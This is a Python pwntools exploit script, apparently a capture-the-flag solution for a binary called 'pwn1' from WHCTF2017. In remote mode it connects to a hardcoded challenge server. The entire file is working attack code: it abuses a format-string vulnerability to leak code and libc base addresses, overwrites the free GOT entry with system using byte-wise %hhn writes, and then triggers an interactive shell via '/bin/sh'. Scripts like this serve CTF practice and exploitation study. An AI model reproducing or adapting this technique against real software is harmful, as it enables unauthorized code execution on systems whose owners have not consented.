from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./pwn1")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn1")
else:
	p = remote("111.198.29.45","57860")
	#libc = ELF("./libc.so.6")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./pwn1")

def menu(choice):
	p.sendlineafter("Input Your Code:\n",str(choice))

def add(name):
	menu(2)
	p.sendafter("Input Your Name:\n",name)

def input(content):
	menu(1)
	p.sendafter("Welcome To WHCTF2017:\n",content)

def write(addr,value,off):
	writen = 0x3e8 + 0xf
	for i in range(8):
		temp = value & 0xff
		temp = (temp + 0x800 - writen) & 0xff
		if temp != 0:
			payload = "%{num}c%{off}$hhn".format(num = temp,off = off - 1 + 6 - 2 + 1)
		else:
			payload = "%{off}$hhn".format(off = off - 1 + 6 - 2 + 1)
		payload = "%s" + payload
		payload = payload.ljust(0xf,"a")
		payload += "\x00"
		payload = "a" * 0x3e0 + "b" * 0x8 + payload + p64(addr + i)
		value = value >> 8
		input(payload)

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}\nb snprintf".format(b1 = hex(code_base + 0xCBD)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
add("a"*0x8)
off = (0x3e8 / 8) + 6
off1 = 0x189
payload = "%{off}$p".format(off = off1 - 1 + 6 - 2)
payload = "a" * 0x3e0 + "b" * 0x8 + "%s" + payload + "\n"
#input("a"*0x3e8 + "%s%6$s\x00")
input(payload)
p.recvuntil("$p\n")
leak_addr = int(p.recvuntil("\n",drop = True),16)
elf.address = leak_addr - 0xda0
log.success("code_base:" + hex(elf.address))
off2 = 0x81
payload = "%{off}$s".format(off = off2 - 1 + 6 - 2)
payload = "a" * 0x3e0 + "b" * 0x8 + "%s" + payload + p64(elf.got["read"])
input(payload)
p.recvuntil(p64(elf.got["read"]).strip("\x00"))
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["read"]
log.success("libc_base:" + hex(libc.address))
target = libc.symbols["system"]
addr = elf.got["free"]
off3 = 0x81
write(addr,target,off3)
add("/bin/sh\x00")
p.interactive()
